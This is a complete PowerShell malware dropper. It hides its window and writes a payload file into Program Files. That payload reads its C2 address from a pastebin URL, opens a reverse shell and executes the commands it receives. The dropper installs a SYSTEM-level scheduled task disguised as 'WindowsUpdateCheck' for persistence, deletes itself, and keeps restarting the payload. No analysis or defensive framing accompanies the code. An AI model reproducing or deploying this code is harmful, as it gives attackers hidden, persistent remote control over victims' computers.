# d.ps1 - Standalone Deployer (C:\Program Files\) - INDEPENDENT EXECUTION
$pf = "C:\Program Files\"
$task = "WindowsUpdateCheck"

# SELF-HIDE (Independent of parent process)
Add-Type -Name Win32 -Namespace Hide -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
[Hide.Win32]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

# C2 PAYLOAD (paste minified payload here - see section 3)
$c2Payload = @'
$pastebinUrl="https://pastebin.com/raw/F4fUrSeS";$i=30;Add-Type -Name W -Namespace Win32 -M ''[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr,int);'';[Win32.W]::ShowWindow((Get-Process -Id $PID).MainWindowHandle,0);function Test-Conn($s){$c=New-Object Net.Sockets.TcpClient;$tcp=$c.ConnectAsync($s.Split(''':'')[0],[int]$s.Split(''':'')[1]);if($tcp.Wait(5e3)){$c.Close();$true}else{$c.Close();$false}};function Get-Srv{$r=iwr $pastebinUrl -UseB -To 10;if($r.StatusCode-eq200 -and $r.Content.Trim()-match''^[a-zA-Z0-9.-]+\:[0-9]+$'' ){$r.Content.Trim()}};function RevShell($s){$p=$s.Split(''':'');$c=New-Object Net.Sockets.TcpClient($p[0],$p[1]);$st=$c.GetStream();$b=New-Object byte[]4096;$h=[Text.Encoding]::ASCII;$info="PS|$env:COMPUTERNAME|$((gl))|$(Get-Date)";$ib=$h.GetBytes($info+"`n");$st.Write($ib,0,$ib.Length);while($c.Connected -and Test-Conn $s){$rb=$st.Read($b,0,$b.Length);if($rb-eq0){break};$cmd=$h.GetString($b,0,$rb).Trim();if($cmd-eq''exit''){break};try{$o=iex $cmd 2>&1|Out-String}catch{$o="Error: $($_.Exception.Message)`n"};$ob=$h.GetBytes($o);$st.Write($ob,0,$ob.Length);$st.Flush()};if($c){$c.Close()}};while(1){$srv=Get-Srv;if($srv){RevShell $srv};Start-Sleep $i}
'@

# 1. Create System.ps1 (Main C2 - INDEPENDENT)
$c2Payload | sc "$pf\System.ps1" -Force -Enc ASCII

# 2. Deploy schtasks (SYSTEM level persistence)
schtasks /create /tn $task /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$pf\System.ps1`"" /sc onstart /ru SYSTEM /rl HIGHEST /f

# 3. Run immediately (triggers System.ps1)
schtasks /run /tn $task

# 4. Self-destruct d.ps1 (leave only System.ps1)
Start-Sleep 3; ri "$pf\d.ps1" -Force -ErrorAction SilentlyContinue

# KEEP RUNNING until manually killed (standalone)
Write-Host "[+] d.ps1 deployed System.ps1 + schtasks - Running monitor..." -ForegroundColor Green
while($true) { 
    if (Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "" -and $_.Path -like "*System.ps1*" }) {
        Start-Sleep 30 
    } else { 
        schtasks /run /tn $task 
        Start-Sleep 30 
    }
}
